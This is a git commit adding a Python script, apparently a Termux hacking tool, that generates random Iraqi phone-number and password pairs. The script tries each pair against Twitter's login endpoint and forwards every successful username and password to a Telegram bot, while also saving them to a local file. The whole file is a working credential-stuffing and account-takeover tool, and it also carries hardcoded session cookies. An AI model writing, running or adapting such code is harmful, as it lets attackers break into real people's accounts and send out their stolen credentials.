49f6700e9428ff885521989788b87539bddf3ec5
raminhakim <72170257+raminhakim@users.noreply.github.com>
2022-02-13 18:46:38 +0300

    Create zhnm.py

---
+++ zhnm.py
@@ -0,0 +1,318 @@
+# Fucked By IpythonI
+import requests,random,time
+from bs4 import BeautifulSoup as BS
+import os,sys
+import time
+from bs4 import BeautifulSoup as bs
+import user_agent
+from user_agent import generate_user_agent
+
+
+logo = """
+\033[1;31m
+
+__  __    _____  __    __ _____  _____  _____  __  __  
+\ \/ /   /__   \/ / /\ \ \\_   \/__   \/__   \/__\/__\ 
+ \  /_____ / /\/\ \/  \/ / / /\/  / /\/  / /\/_\ / \// 
+ /  \_____/ /    \  /\  /\/ /_   / /    / / //__/ _  \ 
+/_/\_\    \/      \/  \/\____/   \/     \/  \__/\/ \_/ 
+       
+       AUTHOR   :: OMAR PALABUN
+       TELEGRAM :: i4m_palabun
+       CHANNEL  :: itsmepalabun  
+           
+           \/ 1                                    
+"""
+
+os.system('clear')
+
+
+
+
+os.system("clear")
+
+    
+def COMBO():
+	os.system('rm -rf /sdcard/download/combo.txt')
+	nnuumm = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm2 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm3 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm4 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm5 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm6 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm7 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm8 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm9 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm10 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm11 = '750','751','752','753','754','770','771','772','773','774','780'
+	nnuumm12 = '750','751','752','753','754','770','771','772','773','774','780'
+	nums = random.choice(nnuumm)
+	nums2 = random.choice(nnuumm2)
+	nums3 = random.choice(nnuumm3)
+	nums4 = random.choice(nnuumm4)
+	nums5 = random.choice(nnuumm5)
+	nums6 = random.choice(nnuumm6)
+	nums7 = random.choice(nnuumm7)
+	nums8 = random.choice(nnuumm8)
+	nums9 = random.choice(nnuumm9)
+	nums10 = random.choice(nnuumm10)
+	nums11 = random.choice(nnuumm11)
+	nums12 = random.choice(nnuumm12)
+
+####d = random.choice(choice)
+	for lol in range(20000):
+                num = ('12345678900987654321')
+                code=random.randint(1000000, 9999999)
+                code2=random.randint(1000000, 9999999)
+                code3=random.randint(1000000, 9999999)
+                code4=random.randint(1000000, 9999999)
+                code5=random.randint(1000000, 9999999)
+                code6=random.randint(1000000, 9999999)
+                code7=random.randint(1000000, 9999999)
+                code8=random.randint(1000000, 9999999)
+                code9=random.randint(1000000, 9999999)
+                code10=random.randint(1000000, 9999999)
+                code11=random.randint(1000000, 9999999)
+                code12=random.randint(1000000, 9999999)
+
+                nn=('+964'+nums+str(code)+":"+'0'+nums+str(code))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn+"\n")
+
+                    nn2=('+964'+nums2+str(code2)+":"+'0'+nums2+str(code))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn2+"\n")
+                    
+                    nn3=('+964'+nums3+str(code3)+":"+'0'+nums3+str(code3))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn3+"\n")
+
+                    nn4=('+964'+nums4+str(code4)+":"+'0'+nums4+str(code4))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn4+"\n")
+
+                    nn5=('+964'+nums5+str(code5)+":"+'0'+nums5+str(code5))
+                with open("//sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn5+"\n")
+
+                    nn6=('+964'+nums6+str(code6)+":"+'0'+nums6+str(code6))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn6+"\n")
+
+                    nn7=('+964'+nums7+str(code7)+":"+'0'+nums7+str(code7))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn7+"\n")
+
+                    nn8=('+964'+nums8+str(code8)+":"+'0'+nums8+str(code8))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn8+"\n")
+
+                    nn9=('+964'+nums9+str(code9)+":"+'0'+nums9+str(code9))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn9+"\n")
+
+                    nn10=('+964'+nums10+str(code10)+':'+'0'+nums10+str(code10))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn10+"\n")
+
+                    nn11=('+964'+nums11+str(code11)+':'+'0'+nums11+str(code11))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn11+"\n")
+
+                    nn12=('+964'+nums12+str(code12)+":"+'0'+nums12+str(code12))
+                with open("/sdcard/download/combo.txt", "a") as bo:
+                    bo.write(nn12+"\n")
+
+                    time.sleep(0)
+                    print(f"\nCOMBO MAKE SUCCESSFULL...")
+                    time.sleep(1)
+                    os.system("clear")
+
+
+    
+
+def TWIT_COMBO():
+	print(logo)
+	tele = input(' Bnusa Y ')
+	if tele == 'y' and 'Y':
+		time.sleep(2)
+        
+		id = input("\n\033[92m id telegram dane > ")
+		bot = input("\n\033[92m Token bot telegram dane > ")
+		os.system("clear")
+	print("Ex : /sdcard/download/combo.txt")
+	h = input(' Nawe combo bnusa. : ')
+	hh = open(h,"r").readlines()
+	bad = 0
+	hit = 0
+	
+	for x in hh:
+		time.sleep(1.5)
+		
+		hh = x.strip()
+		a = hh.split(":")
+		username = a[0]
+		password = a[1]
+		headers={
+		    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
+		    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
+		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+		    'Accept-Encoding': 'gzip, deflate, br',
+		    'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
+		    'Content-Length': '901',
+		    'Content-Type': 'application/x-www-form-urlencoded',
+		    'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
+		    'Host': 'twitter.com',
+		   'Origin': 'https://twitter.com',
+		   'Referer': 'https://twitter.com/login?lang=ar',
+		   'TE': 'Trailers',
+		   'Upgrade-Insecure-Requests': '1',
+		   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0', }
+		data={
+		    'redirect_after_login': '/',
+		    'remember_me': '1',
+		    'authenticity_token': '10908ac0975311eb868c135992f7d397',
+		    'wfa': '1',
+		   'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
+		   'session[username_or_email]': username,
+		   'session[password]': password}
+  
+		url = 'https://twitter.com/sessions'
+
+		r2 = requests.post(url=url,headers=headers,data=data)
+  
+		if ("ct0") in r2.cookies:
+			if "Y" or "y" in tele:
+				tele = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text= HACKED TWITTER BY X NOT FOUND X \n====================\n[=] USER > {username} \n[=] PASS > {password}\n=========== LORD =========\nTELEGRAM : @xXx_not_found_xXx")
+				
+				os.system("clear")
+				hit+=1
+				print(logo)
+				print("--------------------------------------")
+				print("\033[92m [+] OK   : {}".format(hit))
+				print('')
+				print("\033[91m [-] NOT   : {}".format(bad))
+				a = open("/sdcard/download/Goodtweter.txt","w")
+				a.write(username+':'+password+"\n")
+				print('------------------------------------------')
+				print(f"\r\033[92m  Cracking [+] GOOD \033[97m: \033[92m{hit} | \033[91m [-] NOT \033[97m: \033[91m{bad}",end='')
+				print("\n\033[90m    Testing \033[97m>> ",'{ '+f"\033[92m{username}"+" \033[91m: "+f"\033[92m{password}"+' \033[91m}'," \033[91m<<\n")
+				print("""\033[92m
+   ____ ____      _    ____ _  _______ ____  
+  /4___|1 _ \    /O\  /4___|0|/4/4____|  _ \ 
+ |O|   |1|0) |  /6_9\| |---| ' /|  _| | |0| |
+ |O|___|  _ <  / ___ \ |___| . \| |___| |6| |
+  \____|_| \_\/_/   \_\____|_|\_\_____|____/ 
+                                             
+            """)
+
+		else:
+				os.system("clear")
+				bad+=1
+				print(logo)
+				print("--------------------------------------")
+				print("\033[92m [+] OK   : {}".format(hit))
+				print("\033[91m [-] CP   : {}".format(bad))
+				print('')
+				print(f"\r\033[92m  Cracking [+] GOOD \033[97m: \033[92m{hit} | \033[91m [-] NOT \033[97m: \033[91m{bad}",end='')
+				print("\n\033[90m    Testing \033[91m>> ",'{ '+f"\033[91m{username}"+" \033[91m: "+f"\033[91m{password}"+' \033[91m}'," \033[91m<<\n")
+	#	exit()
+		
+def TWIT_RANDOM():
+	print(logo)
+	tele = input(' Bnusa Y ')
+	if tele == 'y' and 'Y':
+		time.sleep(2)
+        
+		id = input("\n\033[92m id telegram dane > ")
+		bot = input("\n\033[92m Token bot telegram dane > ")
+		os.system("clear")
+	hama = open("/sdcard/download/combo.txt","r").readlines()
+	bad = 0
+	hit = 0
+					
+	for x in hama:
+		time.sleep(1.5)
+		
+		hama = x.strip()
+		a = hama.split(":")
+		username = a[0]
+		password = a[1]
+		headers={
+		    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
+		    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
+		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+		    'Accept-Encoding': 'gzip, deflate, br',
+		    'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
+		    'Content-Length': '901',
+		    'Content-Type': 'application/x-www-form-urlencoded',
+		    'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
+		    'Host': 'twitter.com',
+		   'Origin': 'https://twitter.com',
+		   'Referer': 'https://twitter.com/login?lang=ar',
+		   'TE': 'Trailers',
+		   'Upgrade-Insecure-Requests': '1',
+		   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0', }
+		data={
+		    'redirect_after_login': '/',
+		    'remember_me': '1',
+		    'authenticity_token': '10908ac0975311eb868c135992f7d397',
+		    'wfa': '1',
+		   'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
+		   'session[username_or_email]': username,
+		   'session[password]': password}
+
+		url = 'https://twitter.com/sessions'
+
+		r2 = requests.post(url=url,headers=headers,data=data)
+  
+		if ("ct0") in r2.cookies:
+			if "Y" or "y" in tele:
+				tele = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text= HACKED TWITTER BY X NOT FOUND X \n====================\n[=] USER > {username} \n[=] PASS > {password}\n=========== LORD =========\nTELEGRAM : @xXx_not_found_xXx")
+				os.system("clear")
+				hit+=1
+				print(logo)
+				print("--------------------------------------")
+				print("\033[92m [+] OK   : {}".format(hit))
+				print('')
+				print("\033[91m [-] CP   : {}".format(bad))
+				a = open("/sdcard/download/Goodtweter.txt","w")
+				a.write(username+':'+password+"\n")
+				print('------------------------------------------')
+				print(f"\r\033[92m  Cracking [+] GOOD \033[97m: \033[92m{hit} | \033[91m [-] NOT \033[97m: \033[91m{bad}",end='')
+				print("\n\033[90m    Testing \033[92m>> ",'{ '+f"\033[92m{username}"+" \033[91m: "+f"\033[92m{password}"+' \033[92m}'," \033[92m<<\n")
+				print("""\033[92m
+   ____ ____      _    ____ _  _______ ____  
+  /4___|1 _ \    /O\  /4___|0|/4/4____|  _ \ 
+ |O|   |1|0) |  /6_9\| |---| ' /|  _| | |0| |
+ |O|___|  _ <  / ___ \ |___| . \| |___| |6| |
+  \____|_| \_\/_/   \_\____|_|\_\_____|____/ 
+                                             
+            """)
+
+		else:
+				os.system("clear")
+				bad+=1
+				print(logo)
+				print("--------------------------------------")
+				print("\033[92m [+] OK   : {}".format(hit))
+				print("\033[91m [-] CP   : {}".format(bad))
+				print('')
+				print(f"\r\033[92m  Cracking [+] GOOD \033[97m: \033[92m{hit} | \033[91m [-] NOT \033[97m: \033[91m{bad}",end='')
+				print("\n\033[90m    Testing \033[91m>> ",'{ '+f"\033[91m{username}"+" \033[91m: "+f"\033[91m{password}"+' \033[91m}'," \033[91m<<\n")
+    
+
+#exit()
+def menu():
+    print(logo)
+    print('')
+    print(' [01] Crack ba combo\n [02] Crack ba random\n [03] Combo drustka [20K]')
+    xx = input(' OPTION >>> ')
+
+    if xx in ['01','1']:
+        TWIT_COMBO()
+    elif xx in ['02','2']:
+        TWIT_RANDOM()
+    elif xx in ['03','3']:
+        COMBO()
+menu()
